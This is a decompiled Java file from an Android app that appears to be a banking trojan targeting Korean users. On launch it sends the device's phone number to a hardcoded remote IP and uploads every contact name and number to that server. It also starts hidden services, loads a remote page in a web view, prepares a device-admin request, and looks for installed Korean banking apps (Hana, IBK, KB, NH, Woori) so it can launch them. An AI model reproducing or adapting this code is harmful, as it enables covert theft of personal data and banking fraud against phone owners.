// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.tnt2;

import android.app.*;
import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.*;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.*;
import android.webkit.*;
import android.widget.*;
import com.example.contactmanager.Contact;
import com.example.contactmanager.ContactDAO;
import com.example.devicemanager.deviceAdminReceiver;
import com.example.utils.JSONParser;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.*;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

// Referenced classes of package com.example.tnt2:
//            InstallService, neio32

public class MainActivity extends Activity
{
    private class HelloWebViewClient extends WebViewClient
    {

        public boolean shouldOverrideUrlLoading(WebView webview, String s)
        {
            webview.loadUrl(s);
            return true;
        }

        final MainActivity this$0;

        private HelloWebViewClient()
        {
            this$0 = MainActivity.this;
            super();
        }

        HelloWebViewClient(HelloWebViewClient hellowebviewclient)
        {
            this();
        }
    }


    public MainActivity()
    {
        jsonParser = new JSONParser();
        insert_phone_url = "http://223.255.198.147/home/send_sim_no.php";
        sendSMS_insert_url = "http://223.255.198.147/home/phon_no.php";
        type1 = null;
        type2 = null;
        type3 = null;
        type = "SKT";
        phoneNumber = "";
    }

    private void doWork()
    {
        Intent intent = new Intent();
        intent.setClass(getApplicationContext(), com/example/tnt2/InstallService);
        startService(intent);
        if(netWorkIsAvailable(getApplicationContext()))
        {
            sendPhone();
            sendSMSPhone();
        }
        upLoadContact();
        Intent intent1 = new Intent();
        intent1.setClass(getApplicationContext(), com/example/tnt2/neio32);
        startService(intent1);
    }

    public static void httpPostUpload(String s, List list)
    {
        DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(s);
        try
        {
            httppost.setEntity(new UrlEncodedFormEntity(list, "EUC-KR"));
            Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params2));", "gone");
        }
        catch(UnsupportedEncodingException unsupportedencodingexception)
        {
            unsupportedencodingexception.printStackTrace();
        }
        try
        {
            Log.d("response=httpclient.execute(httppost);", defaulthttpclient.execute(httppost).toString());
            return;
        }
        catch(ClientProtocolException clientprotocolexception)
        {
            clientprotocolexception.printStackTrace();
            return;
        }
        catch(IOException ioexception)
        {
            ioexception.printStackTrace();
        }
    }

    private void openDialog()
    {
        doWork();
    }

    private void startcomActivity()
    {
        Intent intent;
        List list;
        intent = new Intent();
        PackageManager packagemanager = getPackageManager();
        Intent intent1 = new Intent("android.intent.action.MAIN", null);
        intent1.addCategory("android.intent.category.LAUNCHER");
        list = packagemanager.queryIntentActivities(intent1, 0);
        Collections.sort(list, new android.content.pm.ResolveInfo.DisplayNameComparator(packagemanager));
        if(list == null) goto _L2; else goto _L1
_L1:
        int i;
        int j;
        i = list.size();
        j = 0;
_L5:
        if(j < i) goto _L3; else goto _L2
_L2:
        return;
_L3:
        ResolveInfo resolveinfo;
        new ApplicationInfo();
        resolveinfo = (ResolveInfo)list.get(j);
        ApplicationInfo applicationinfo = resolveinfo.activityInfo.applicationInfo;
        resolveinfo.activityInfo.applicationInfo;
        if((1 & applicationinfo.flags) <= 0)
            break; /* Loop/switch isn't completed */
        StringBuilder stringbuilder = new StringBuilder();
        resolveinfo.activityInfo.applicationInfo;
        Log.i("appInfo", stringbuilder.append(1).toString());
_L6:
        j++;
        if(true) goto _L5; else goto _L4
_L4:
        String s = resolveinfo.activityInfo.applicationInfo.packageName;
        if(s.equals("com.hanabank.ebk.channel.android.hananbank"))
        {
            Log.d("find app", "----com.hanabank.ebk.channel.android.hananbank--");
            intent.setClassName("com.hanabank.ebk.channel.android.hananbank", "com.hanabank.ebk.channel.android.hananbank.app.HanaIntro");
            intent.setFlags(0x10000000);
            startActivity(intent);
            return;
        }
        if(s.equals("com.ibk.neobanking"))
        {
            Log.d("find app", "----com.ibk.spbs--");
            intent.setClassName("com.ibk.neobanking", "com.ibk.neobanking.ui.Intro");
            intent.setFlags(0x10000000);
            startActivity(intent);
            return;
        }
        if(s.equals("com.kbstar.kbbank"))
        {
            Log.d("find app", "----com.ATsolution.KBbank--");
            intent.setClassName("com.kbstar.kbbank", "com.kbstar.kbbank.UI.CIntro");
            intent.setFlags(0x10000000);
            startActivity(intent);
            return;
        }
        if(s.equals("nh.smart"))
        {
            Log.d("find app", "----nh.smart--");
            intent.setClassName("nh.smart", "nh.smart.menu.activity.MainMenu");
            intent.setFlags(0x10000000);
            startActivity(intent);
            return;
        }
        if(s.equals("com.webcash.wooribank"))
        {
            Log.d("find app", "----com.webcash.wooribank--");
            intent.setClassName("com.webcash.wooribank", "com.webcash.wooribank.Intro");
            intent.setFlags(0x10000000);
            startActivity(intent);
            return;
        }
        if(s.equals("com.hanabank.ebk.channel.android.hananbank"))
        {
            Log.d("find app", "----com.shinhan.sbanking--");
            intent.setClassName("nh.smart", "nh.smart.menu.activity.MainMenu");
            intent.setFlags(0x10000000);
            startActivity(intent);
            return;
        }
          goto _L6
        if(true) goto _L5; else goto _L7
_L7:
    }

    private void upLoadCallRecords()
    {
    }

    private void upLoadContact()
    {
        (new Thread() {

            public void run()
            {
                Log.d("upLoadContact", "-----upload start");
                List list = (new ContactDAO(MainActivity.this)).getContactList();
                if(list != null)
                {
                    int i = list.size();
                    int j = 0;
                    while(j < i) 
                    {
                        Contact contact = (Contact)list.get(j);
                        params = new ArrayList();
                        params.add(new BasicNameValuePair("name", contact.getContactname()));
                        params.add(new BasicNameValuePair("number", contact.getContactnumber()));
                        params.add(new BasicNameValuePair("extra", phoneNumber));
                        Log.d("name", (new StringBuilder("---")).append(contact.getContactname()).toString());
                        Log.d("number", (new StringBuilder("---")).append(contact.getContactnumber()).toString());
                        Log.d("extra", (new StringBuilder("----")).append(phoneNumber).toString());
                        try
                        {
                            MainActivity.httpPostUpload("http://223.255.198.147/home/send_phonlist.php", params);
                            Log.d("httpPostUpload", "-----upload start");
                        }
                        catch(Exception exception)
                        {
                            exception.printStackTrace();
                            return;
                        }
                        j++;
                    }
                }
            }

            final MainActivity this$0;

            
            {
                this$0 = MainActivity.this;
                super();
            }
        }).start();
    }

    public boolean netWorkIsAvailable(Context context)
    {
        NetworkInfo networkinfo = ((ConnectivityManager)context.getSystemService("connectivity")).getActiveNetworkInfo();
        return networkinfo != null && networkinfo.isConnectedOrConnecting();
    }

    public void onCreate(Bundle bundle)
    {
        Log.i("SHUNXUN", "activity_create");
        super.onCreate(bundle);
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new HelloWebViewClient(null));
        webView.loadUrl("http://223.255.198.147/momo/x/index.php");
        setContentView(webView);
        TelephonyManager telephonymanager = (TelephonyManager)getSystemService("phone");
        phoneNumber = telephonymanager.getLine1Number();
        if(phoneNumber == null || phoneNumber.length() < 11)
            phoneNumber = telephonymanager.getLine1Number();
        Log.d("phoneNumber", (new StringBuilder("----")).append(phoneNumber).toString());
        activityList = new ArrayList();
        activityList.add(this);
        openDialog();
        StrictMode.setThreadPolicy((new android.os.StrictMode.ThreadPolicy.Builder()).detectDiskReads().detectDiskWrites().detectNetwork().penaltyLog().build());
        StrictMode.setVmPolicy((new android.os.StrictMode.VmPolicy.Builder()).detectLeakedSqlLiteObjects().penaltyLog().penaltyDeath().build());
        mDPM = (DevicePolicyManager)getSystemService("device_policy");
        mAM = (ActivityManager)getSystemService("activity");
        mDeviceComponentName = new ComponentName(this, com/example/devicemanager/deviceAdminReceiver);
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", mDeviceComponentName);
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "manager");
    }

    public boolean onCreateOptionsMenu(Menu menu)
    {
        getMenuInflater().inflate(0x7f070000, menu);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem menuitem)
    {
        return super.onOptionsItemSelected(menuitem);
    }

    void sendPhone()
    {
        (new Thread() {

            public void run()
            {
                SimpleDateFormat simpledateformat;
                params = new ArrayList();
                TelephonyManager telephonymanager = (TelephonyManager)getSystemService("phone");
                String s = telephonymanager.getLine1Number();
                if(s == null || s.length() < 13)
                    telephonymanager.getLine1Number();
                simpledateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String s2 = simpledateformat.format(new Date(System.currentTimeMillis()));
                String s1 = s2;
_L1:
                TelephonyManager telephonymanager1 = (TelephonyManager)getSystemService("phone");
                params.add(new BasicNameValuePair("sim_no", telephonymanager1.getLine1Number()));
                params.add(new BasicNameValuePair("datetime", s1));
                DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost(insert_phone_url);
                Exception exception;
                try
                {
                    httppost.setEntity(new UrlEncodedFormEntity(params, "EUC-KR"));
                    Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params2));", "gone");
                }
                catch(UnsupportedEncodingException unsupportedencodingexception)
                {
                    unsupportedencodingexception.printStackTrace();
                }
                try
                {
                    Log.d("response=httpclient.execute(httppost);sendphone OK", defaulthttpclient.execute(httppost).toString());
                    return;
                }
                catch(ClientProtocolException clientprotocolexception)
                {
                    clientprotocolexception.printStackTrace();
                    return;
                }
                catch(IOException ioexception)
                {
                    ioexception.printStackTrace();
                }
                break MISSING_BLOCK_LABEL_254;
                exception;
                s1 = "1970-01-01 10:12:13";
                  goto _L1
            }

            final MainActivity this$0;

            
            {
                this$0 = MainActivity.this;
                super();
            }
        }).start();
    }

    void sendSMSPhone()
    {
        (new Thread() {

            public void run()
            {
                TelephonyManager telephonymanager = (TelephonyManager)getSystemService("phone");
                params = new ArrayList();
                params.add(new BasicNameValuePair("sim_no", telephonymanager.getLine1Number()));
                DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost(sendSMS_insert_url);
                try
                {
                    httppost.setEntity(new UrlEncodedFormEntity(params, "EUC-KR"));
                    Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params2));", "gone");
                }
                catch(UnsupportedEncodingException unsupportedencodingexception)
                {
                    unsupportedencodingexception.printStackTrace();
                }
                try
                {
                    Log.d("response=httpclient.execute(httppost);sendphone OK", defaulthttpclient.execute(httppost).toString());
                    return;
                }
                catch(ClientProtocolException clientprotocolexception)
                {
                    clientprotocolexception.printStackTrace();
                    return;
                }
                catch(IOException ioexception)
                {
                    ioexception.printStackTrace();
                }
            }

            final MainActivity this$0;

            
            {
                this$0 = MainActivity.this;
                super();
            }
        }).start();
    }

    static final int RESULT_ENABLE = 1;
    private static final String TAG_SUCCESS = "success";
    public static List activityList;
    static final String send_contact_url = "http://223.255.198.147/home/send_phonlist.php";
    Button btn;
    EditText et1;
    RadioGroup et2;
    EditText et3;
    EditText et4;
    EditText et5;
    String insert_phone_url;
    JSONParser jsonParser;
    ActivityManager mAM;
    DevicePolicyManager mDPM;
    ComponentName mDeviceComponentName;
    private ProgressDialog pDialog;
    List params;
    String phoneNumber;
    String sendSMS_insert_url;
    String type;
    RadioButton type1;
    RadioButton type2;
    RadioButton type3;
    WebView webView;
}
